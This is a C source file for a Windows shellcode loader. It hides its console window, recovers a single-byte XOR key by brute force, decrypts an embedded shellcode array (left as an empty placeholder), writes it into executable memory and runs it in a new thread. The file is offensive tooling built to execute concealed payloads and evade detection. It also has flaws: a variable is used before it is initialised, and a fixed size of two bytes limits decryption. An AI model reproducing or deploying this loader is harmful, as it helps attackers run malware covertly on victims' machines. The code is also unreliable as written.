#include<windows.h>
#include<time.h>
#define DECRYPTED_KEY 0xFC
#define SHELLCODE_SIZE 2


void hiddenConsole();


int getRandKey();


BYTE getDecryptionKey(unsigned char shellcode[]);


void decryptShellcode(unsigned char shellcode[], BYTE decryptionKey);


int main(int argc, char* argv[]) 
{
	hiddenConsole();
	unsigned char shellcode[] = {
		//SHELLCODE OBFUSCATED HERE
	};

  	BYTE decryptionKey = getDecryptionKey(shellcode);
  	decryptShellcode(shellcode, decryptionKey);
  
	PVOID dstPointer = VirtualAlloc(
		0, 
		sizeof(shellcode), 
		MEM_COMMIT | MEM_RESERVE, 
		PAGE_EXECUTE_READWRITE
	);
	
	if (dstPointer == NULL) 
	{
		return 1;
	}
	
	CopyMemory(
		dstPointer, 
		shellcode, 
		sizeof(shellcode)
	);
	
	HANDLE thread = CreateThread(
		NULL, 
		0, 
		(LPTHREAD_START_ROUTINE)dstPointer, 
		NULL, 
		0, 
		0
	);
	
	if (thread == NULL)
	{
		return 1;
	}

	WaitForSingleObject(thread, INFINITE);
	CloseHandle(thread);
	return 0;
}


void hiddenConsole() 
{
	HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL); 																	  
	ShowWindow(window, 0);
}


int getRandKey(int MIN, int MAX) 
{
	srand((unsigned int)time(NULL));
	return rand() % (MAX - MIN + 1) + MIN;
}


BYTE getDecryptionKey(unsigned char shellcode[]) 
{
	const int MIN = 0x00;
  	const int MAX = 0x09;
	int decryptionKey = getRandKey(MIN, MAX);
	BYTE key = shellcode[0] ^ key;
	while (key != DECRYPTED_KEY) 
	{
		decryptionKey = getRandKey(MIN, MAX);
		key = shellcode[0] ^ decryptionKey;
	}

	return decryptionKey;
}


void decryptShellcode(unsigned char shellcode[], BYTE decryptionKey) 
{
	int i = 0;
	while (i < SHELLCODE_SIZE) 
	{
	   shellcode[i] = shellcode[i] ^ decryptionKey;
	   i++;
	}
}